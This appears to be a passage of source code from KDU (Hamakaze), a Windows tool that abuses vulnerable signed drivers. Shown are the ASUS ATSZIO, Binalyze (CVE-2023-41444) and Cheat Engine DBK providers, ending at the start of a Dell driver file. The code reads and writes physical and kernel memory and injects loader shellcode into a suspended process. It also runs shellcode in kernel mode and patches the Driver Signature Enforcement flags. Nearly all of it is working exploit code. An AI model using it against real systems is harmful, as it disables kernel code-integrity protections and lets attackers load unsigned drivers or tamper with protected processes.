*
* Unmap previously mapped physical memory.
*
*/
VOID AtszioUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle
)
{
    ATSZIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.SectionHandle = SectionHandle;
    request.MappedBaseAddress = SectionToUnmap;

    supCallDriver(DeviceHandle,
        IOCTL_ATSZIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* AtszioQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI AtszioQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
    HANDLE sectionHandle = NULL;

    DWORD cbRead = 0x100000;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)AtszioMapMemory(DeviceHandle,
        0ULL,
        cbRead,
        &sectionHandle);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        AtszioUnmapMemory(DeviceHandle,
            (PVOID)pbLowStub1M,
            sectionHandle);

    }

    return (PML4 != 0);
}

/*
* AtszioReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI AtszioReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR offset;
    HANDLE sectionHandle = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = AtszioMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        AtszioUnmapMemory(DeviceHandle,
            mappedSection,
            sectionHandle);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* AtszioReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI AtszioReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return AtszioReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* AtszioWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI AtszioWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return AtszioReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* AtszioVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI AtszioVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        AtszioQueryPML4Value,
        AtszioReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* AtszioWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory via ATSZIO.
*
*/
BOOL WINAPI AtszioWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = AtszioVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = AtszioReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* AtszioReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory via ATSZIO.
*
*/
BOOL WINAPI AtszioReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = AtszioVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = AtszioReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

```

`Source/Hamakaze/idrv/atszio.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       ATSZIO.H
*
*  VERSION:     1.01
*
*  DATE:        12 Feb 2020
*
*  ASUSTeK ATSZIO WinFlash driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// ASUSTeK ATSZIO WinFlash driver interface.
//

#define ATSZIO_DEVICE_TYPE          (DWORD)0x8807

#define ATSZIO_MAP_SECTION_FUNCID   (DWORD)0x803
#define ATSZIO_UNMAP_SECTION_FUNCID (DWORD)0x804

#define IOCTL_ATSZIO_MAP_USER_PHYSICAL_MEMORY      \
    CTL_CODE(ATSZIO_DEVICE_TYPE, ATSZIO_MAP_SECTION_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x8807200C

#define IOCTL_ATSZIO_UNMAP_USER_PHYSICAL_MEMORY    \
    CTL_CODE(ATSZIO_DEVICE_TYPE, ATSZIO_UNMAP_SECTION_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x88072010


#pragma warning(push)
#pragma warning(disable:4324) // structure padded due to __declspec(align())
typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT)_ATSZIO_PHYSICAL_MEMORY_INFO {
    ULONG_PTR Unused0;
    HANDLE SectionHandle;
    ULONG ViewSize;
    ULONG Padding0;
    ULARGE_INTEGER Offset;
    PVOID MappedBaseAddress;
} ATSZIO_PHYSICAL_MEMORY_INFO, * PATSZIO_PHYSICAL_MEMORY_INFO;
#pragma warning(pop)

BOOL WINAPI AtszioQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI AtszioVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI AtszioReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI AtszioWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI AtszioWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI AtszioReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/binalyze.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       BINALYZE.CPP
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Binalyze driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/binalyze.h"

//
// Based on CVE-2023-41444
//

/*
* BeDrvOpenProcess
*
* Purpose:
*
* Open process via Binalyze driver.
*
*/
BOOL WINAPI BeDrvOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle)
{
    UNREFERENCED_PARAMETER(DesiredAccess);

    BOOL bResult = FALSE;
    DWORD data = HandleToUlong(ProcessId);

    bResult = supCallDriver(DeviceHandle,
        IOCTL_IREC_OPEN_PROCESS,
        &data,
        sizeof(data),
        &data,
        sizeof(data));

    *ProcessHandle = UlongToHandle(data);

    return bResult;
}

```

`Source/Hamakaze/idrv/binalyze.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       BINALYZE.H
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Binalyze driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define IREC_DEVICE_TYPE            (DWORD)0x8001
#define IREC_FUNCTION_OPEN_PROCESS  (DWORD)0x80A

#define IOCTL_IREC_OPEN_PROCESS      \
    CTL_CODE(IREC_DEVICE_TYPE, IREC_FUNCTION_OPEN_PROCESS, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80012028

BOOL WINAPI BeDrvOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

```

`Source/Hamakaze/idrv/dbk.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       DBK.CPP
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Cheat Engine's DBK driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/dbk.h"
#include "idrv/ldrsc.h"

#define DBK_LDR_DLL L"u.dll"
#define DBK_KMU_EXE L"kernelmoduleunloader.exe"
#define DBK_KMU_SIG L"kernelmoduleunloader.exe.sig"

#define DBK_DEVICE_NAME L"\\Device\\CEDRIVER73"
#define DBK_DEVICE_LINK L"\\DosDevices\\CEDRIVER73"
#define DBK_PROCESS_LIST L"\\BaseNamedObjects\\DBKProcList60"
#define DBK_THREAD_LIST L"\\BaseNamedObjects\\DBKThreadList60"

/*
* DbkSetupCheatEngineObjectNames
*
* Purpose:
*
* supLoadDriverEx callback to store specific CheatEngine's data in registry entry.
*
*/
NTSTATUS CALLBACK DbkSetupCheatEngineObjectNames(
    _In_ PUNICODE_STRING RegistryPath,
    _In_opt_ PVOID Param
)
{
    NTSTATUS ntStatus;
    HANDLE hKey = NULL;
    OBJECT_ATTRIBUTES obja;

    UNREFERENCED_PARAMETER(Param);

    InitializeObjectAttributes(&obja, RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
    if (NT_SUCCESS(ntStatus)) {

        supRegWriteValueString(hKey, L"A", DBK_DEVICE_NAME);
        supRegWriteValueString(hKey, L"B", DBK_DEVICE_LINK);
        supRegWriteValueString(hKey, L"C", DBK_PROCESS_LIST);
        supRegWriteValueString(hKey, L"D", DBK_THREAD_LIST);

        NtClose(hKey);
    }

    return ntStatus;
}

/*
* DbkOpenCheatEngineDriver
*
* Purpose:
*
* Open Cheat Engine driver with it locking features in mind.
*
*/
BOOL DbkOpenCheatEngineDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bResult = FALSE;
    DWORD cch;
    PVOID ipcServer = NULL;
    WCHAR szTemp[MAX_PATH + 1];
    WCHAR szFileName[MAX_PATH * 2];

    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    supExtractFileToTemp(Context->ModuleBase, IDR_DATA_KMUEXE, szTemp, DBK_KMU_EXE, FALSE);
    supExtractFileToTemp(Context->ModuleBase, IDR_DATA_KMUSIG, szTemp, DBK_KMU_SIG, FALSE);
    supExtractFileToTemp(GetModuleHandle(NULL), IDR_TAIGEI32, szTemp, DBK_LDR_DLL, FALSE);

    StringCchPrintf(szFileName,
        MAX_PATH * 2,
        TEXT("%ws\\%ws"),
        szTemp,
        DBK_KMU_EXE);

    PVOID kmuBase = supMapFileAsImage(szFileName);
    PVOID entryPoint = NULL;
    if (kmuBase) {
        entryPoint = supGetEntryPointForMappedFile(kmuBase);
        UnmapViewOfFile(kmuBase);
    }
    else {
        SetLastError(ERROR_FILE_NOT_FOUND);
        goto Cleanup;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&si, sizeof(si));
    RtlSecureZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    GetStartupInfo(&si);

    if (CreateProcess(NULL,
        szFileName,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        szTemp,
        &si,
        &pi))
    {
        SIZE_T memIO = 0;

        if (WriteProcessMemory(pi.hProcess,
            entryPoint,
            g_KduLoaderShellcode,
            sizeof(g_KduLoaderShellcode),
            &memIO))
        {
            ipcServer = IpcStartApiServer(supIpcDuplicateHandleCallback,
                supIpcOnException,
                NULL,
                NULL,
                (PVOID)Context);

            ResumeThread(pi.hThread);
        }

        if (ipcServer) {
            WaitForSingleObject(pi.hProcess, INFINITE);
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        bResult = (Context->DeviceHandle != NULL);
    }

Cleanup:
    if (ipcServer) IpcStopApiServer(ipcServer);
    supExtractFileToTemp(NULL, 0, szTemp, DBK_KMU_EXE, TRUE);
    supExtractFileToTemp(NULL, 0, szTemp, DBK_KMU_SIG, TRUE);
    supExtractFileToTemp(NULL, 0, szTemp, DBK_LDR_DLL, TRUE);

    return bResult;
}

/*
* DbkStartVulnerableDriver
*
* Purpose:
*
* Load/open vulnerable driver callback.
*
*/
BOOL DbkStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bLoaded = FALSE;
    NTSTATUS ntStatus;
    KDU_DB_ENTRY* provLoadData = Context->Provider->LoadData;
    LPWSTR lpDeviceName = provLoadData->DeviceName;
    LPWSTR lpDriverName = provLoadData->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        if (!KDUProvExtractVulnerableDriver(Context))
            return FALSE;

        ntStatus = supLoadDriverEx(lpDriverName,
            lpFullFileName,
            FALSE,
            DbkSetupCheatEngineObjectNames,
            NULL);

        if (NT_SUCCESS(ntStatus)) {

            supPrintfEvent(kduEventInformation,
                "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);

            bLoaded = TRUE;
        }
        else {
            supShowHardError("[!] Unable to load vulnerable driver", ntStatus);
            DeleteFile(lpFullFileName);
        }

    }

    if (bLoaded) {

        printf_s("[+] Acquiring handle for driver device \"%ws\" -> please wait, this can take a few seconds\r\n",
            provLoadData->DeviceName);

        if (DbkOpenCheatEngineDriver(Context)) {

            supPrintfEvent(kduEventInformation,
                "[+] Successfully acquired handle for driver device \"%ws\"\r\n",
                provLoadData->DeviceName);

        }
    }

    return (Context->DeviceHandle != NULL);
}

/*
* DbkpAllocateNonPagedMemory
*
* Purpose:
*
* Allocates nonpaged executable memory by calling ExAllocatePool.
*
*/
PVOID DbkpAllocateNonPagedMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG Size
)
{
    struct {
        ULONG Size;
    } inputBuffer;

    PVOID pvMemory = NULL;

    inputBuffer.Size = Size;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_ALLOCATEMEM_NONPAGED,
        &inputBuffer,
        sizeof(inputBuffer),
        &pvMemory,
        sizeof(pvMemory));

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        pvMemory = NULL;
    }
    return pvMemory;
}

/*
* DbkpFreeMemory
*
* Purpose:
*
* Attempts to call ExFreePool for given address.
*
*/
BOOL DbkpFreeMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Address
)
{
    struct {
        PVOID Address;
    } inputBuffer;

    inputBuffer.Address = Address;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_FREEMEM,
        &inputBuffer,
        sizeof(inputBuffer),
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return FALSE;
    }

    return TRUE;
}

/*
* DbkpMapMemorySelf
*
* Purpose:
*
* Map memory to current process VA space using MDL.
*
*/
PVOID DbkpMapMemorySelf(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Address,
    _In_ ULONG Size,
    _Out_ PVOID* MdlAddress
)
{
    struct {
        ULONG_PTR SourceProcessId;
        ULONG_PTR TargetProcessId;
        PVOID Address;
        ULONG Size;
    } inputBuffer;

    struct {
        PVOID Mdl;
        PVOID Address;
    } outputBuffer;

    inputBuffer.SourceProcessId = 0;
    inputBuffer.TargetProcessId = 0;
    inputBuffer.Address = Address;
    inputBuffer.Size = Size;

    outputBuffer.Address = NULL;
    outputBuffer.Mdl = NULL;

    *MdlAddress = NULL;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_MAP_MEMORY,
        &inputBuffer,
        sizeof(inputBuffer),
        &outputBuffer,
        sizeof(outputBuffer));

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return NULL;
    }

    *MdlAddress = outputBuffer.Mdl;

    return outputBuffer.Address;
}

/*
* DbkpUnmapMemorySelf
*
* Purpose:
*
* Unmap memory from current process VA space using MDL.
*
*/
BOOL DbkpUnmapMemorySelf(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Address,
    _In_ PVOID Mdl
)
{
    struct {
        PVOID Mdl;
        PVOID Address;
    } inputBuffer;

    inputBuffer.Mdl = Mdl;
    inputBuffer.Address = Address;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_UNMAP_MEMORY,
        &inputBuffer,
        sizeof(inputBuffer),
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return FALSE;
    }

    return TRUE;
}

/*
* DbkpExecuteCodeAtAddress
*
* Purpose:
*
* Run code at specified address in kernel mode.
*
*/
BOOL DbkpExecuteCodeAtAddress(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Address
)
{
    struct {
        PVOID Address;
        PVOID Parameters;
    } inputBuffer;

    inputBuffer.Address = Address;
    inputBuffer.Parameters = NULL;

    NTSTATUS ntStatus = supCallDriver(DeviceHandle,
        IOCTL_CE_EXECUTE_CODE,
        &inputBuffer,
        sizeof(inputBuffer),
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return FALSE;
    }

    return TRUE;
}

/*
* DbkpMapAndExecuteCode
*
* Purpose:
*
* Allocate page for shellcode, map it and execute.
*
*/
BOOL DbkpMapAndExecuteCode(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ShellCode,
    _In_ ULONG SizeOfShellCode,
    _In_ BOOLEAN ShowResult,
    _In_opt_ HANDLE ReadyEventHandle,
    _In_opt_ HANDLE SectionHandle
)
{
    BOOL bSuccess = FALSE;
    HANDLE deviceHandle = Context->DeviceHandle;

    PVOID pvPage = DbkpAllocateNonPagedMemory(deviceHandle, PAGE_SIZE);

    if (pvPage) {

        printf_s("[+] NonPagedPool memory allocated at 0x%p\r\n", pvPage);

        PVOID mdl = NULL, ptr = NULL;

        ptr = DbkpMapMemorySelf(deviceHandle, pvPage, PAGE_SIZE, &mdl);
        if (ptr && mdl) {

            printf_s("[+] Mdl allocated at 0x%p\r\n", mdl);
            printf_s("[+] Memory mapped at 0x%p\r\n", ptr);

            RtlCopyMemory(ptr,
                ShellCode,
                SizeOfShellCode);

            DbkpUnmapMemorySelf(deviceHandle, ptr, mdl);

            printf_s("[+] Executing code at 0x%p\r\n", pvPage);

            bSuccess = DbkpExecuteCodeAtAddress(deviceHandle, pvPage);

            if (bSuccess) {

                printf_s("[+] Code executed successfully\r\n");

                if (ShowResult &&
                    ReadyEventHandle &&
                    SectionHandle)
                {

                    //
                    // Wait for the shellcode to trigger the event
                    //
                    if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

                        supPrintfEvent(kduEventError,
                            "[!] Shellcode did not trigger the event within two seconds.\r\n");

                        bSuccess = FALSE;
                    }
                    else
                    {

                        KDUShowPayloadResult(Context, SectionHandle);
                    }
                }

            }
            else {
                supShowWin32Error("[!] Failed to execute code", GetLastError());
            }

        }
        else {
            supShowWin32Error("[!] Failed to map memory", GetLastError());
        }

        DbkpFreeMemory(deviceHandle, pvPage);
    }
    else {
        supShowWin32Error("[!] Failed to allocate nonpaged memory", GetLastError());
    }

    return bSuccess;
}

/*
* DbkMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL DbkMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase)
{
    BOOL bSuccess = FALSE;
    PVOID pvShellCode;
    HANDLE deviceHandle;
    HANDLE sectionHandle = NULL;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    deviceHandle = Context->DeviceHandle;

    pvShellCode = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
    if (pvShellCode) {

        HANDLE readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
        if (readyEventHandle) {

            DbkpMapAndExecuteCode(Context,
                pvShellCode,
                ScSizeOf(Context->ShellVersion, NULL),
                TRUE,
                readyEventHandle,
                sectionHandle);

            CloseHandle(readyEventHandle);

        } //readyEventHandle
        else {

            supPrintfEvent(kduEventError,
                "[!] Error building the ready event handle, abort\r\n");

            bSuccess = FALSE;
        }

        if (sectionHandle) {
            NtClose(sectionHandle);
        }

    } //pvShellCode
    else {

        supPrintfEvent(kduEventError,
            "[!] Error while building shellcode, abort\r\n");

        bSuccess = FALSE;
    }

    if (pvShellCode) 
        ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}

#ifdef __cplusplus
extern "C" {
    void BaseShellDSEFix();
    void BaseShellDSEFixEnd();
}
#endif

/*
* DbkControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags state via Dbk driver.
*
*/
BOOL DbkControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;

    BYTE shellBuffer[SHELLCODE_SMALL];
    SIZE_T shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);

    *(PULONG_PTR)&shellBuffer[0x2] = Address;
    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;

    if (shellSize > SHELLCODE_SMALL) {
        supPrintfEvent(kduEventError,
            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);

        return FALSE;
    }

    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
        (PVOID)Address,
        DSEValue);

    if (DbkpMapAndExecuteCode(Context,
        shellBuffer,
        (ULONG)shellSize,
        FALSE,
        NULL,
        NULL))
    {
        supPrintfEvent(kduEventInformation,
            "[+] DSE patch executed successfully\r\n");
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}

/*
* DbkOpenProcess
*
* Purpose:
*
* Open process via CheatEngine driver.
*
*/
BOOL WINAPI DbkOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle)
{
    UNREFERENCED_PARAMETER(DesiredAccess);

    struct {
        HANDLE ProcessHandle;
        BYTE Special;
    } outputBuffer = { NULL, 0 };

    BOOL bResult = supCallDriver(DeviceHandle,
        IOCTL_CE_OPENPROCESS,
        &ProcessId,
        sizeof(DWORD),
        &outputBuffer,
        sizeof(outputBuffer));

    *ProcessHandle = outputBuffer.ProcessHandle;

    return bResult;
}

```

`Source/Hamakaze/idrv/dbk.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       DBK.H
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Cheat Engine's DBK driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Cheat Engine's DBK driver interface.
//

#define DBK_DEVICE_TYPE (DWORD)FILE_DEVICE_UNKNOWN

#define DBK_FUNC_OPEN_PROCESS (DWORD)0x0802
#define DBK_FUNC_ALLOCATEMEM_NONPAGED (DWORD)0x0826
#define DBK_FUNC_FREEMEM (DWORD)0x084C
#define DBK_FUNC_MAP_MEMORY (DWORD)0x084D
#define DBK_FUNC_UNMAP_MEMORY (DWORD)0x084E
#define DBK_FUNC_EXECUTE_CODE (DWORD)0x083C

#define	IOCTL_CE_ALLOCATEMEM_NONPAGED    \
    CTL_CODE(DBK_DEVICE_TYPE, DBK_FUNC_ALLOCATEMEM_NONPAGED, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define	IOCTL_CE_FREEMEM    \
    CTL_CODE(DBK_DEVICE_TYPE, DBK_FUNC_FREEMEM, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_CE_MAP_MEMORY    \
    CTL_CODE(DBK_DEVICE_TYPE, DBK_FUNC_MAP_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_CE_UNMAP_MEMORY    \
    CTL_CODE(DBK_DEVICE_TYPE, DBK_FUNC_UNMAP_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_CE_EXECUTE_CODE    \
    CTL_CODE(DBK_DEVICE_TYPE, DBK_FUNC_EXECUTE_CODE, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_CE_OPENPROCESS     \
    CTL_CODE(DBK_DEVICE_TYPE, DBK_FUNC_OPEN_PROCESS, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)


BOOL DbkStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

BOOL DbkMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase);

BOOL DbkControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address);

BOOL WINAPI DbkOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

```

`Source/Hamakaze/idrv/dell.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2025
*
*  TITLE:       DELL.CPP
*
*  VERSION:     1.44
*
*  DATE:        18 Aug 2025
*
*  Dell drivers routines.
*
